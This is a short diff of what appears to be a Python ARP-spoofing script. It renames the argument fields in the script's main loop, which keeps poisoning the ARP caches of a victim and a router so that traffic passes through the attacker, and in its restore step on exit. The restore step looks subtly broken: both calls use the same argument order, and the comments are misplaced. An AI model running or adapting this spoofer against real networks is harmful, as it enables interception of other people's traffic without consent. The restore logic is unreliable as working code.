@@ -36,9 +36,9 @@ count = 0
 try:
 	while True:		
 		#telling client i am the router
-		spoof(args.victim, args.spoof)
+		spoof(args.victimIP, args.spoofIP)
 		#telling router i am the client
-		spoof(args.spoof, args.victim)		
+		spoof(args.spoofIP, args.victimIP)		
 		count = count + 2
 		print("\r[+] send two packets {}".format(count))
 		time.sleep(2)
@@ -46,7 +46,7 @@ try:
 except KeyboardInterrupt:
 
 		print("\n[+] Detected CTRL+C Quitting and restoring arp value please wait")
-		restore(args.victim, args.spoof)
+		restore(args.victimIP, args.spoofIP)
 		#restoring client
-		restore(args.victim, args.spoof)
+		restore(args.victimIP, args.spoofIP)
 		#restoring router
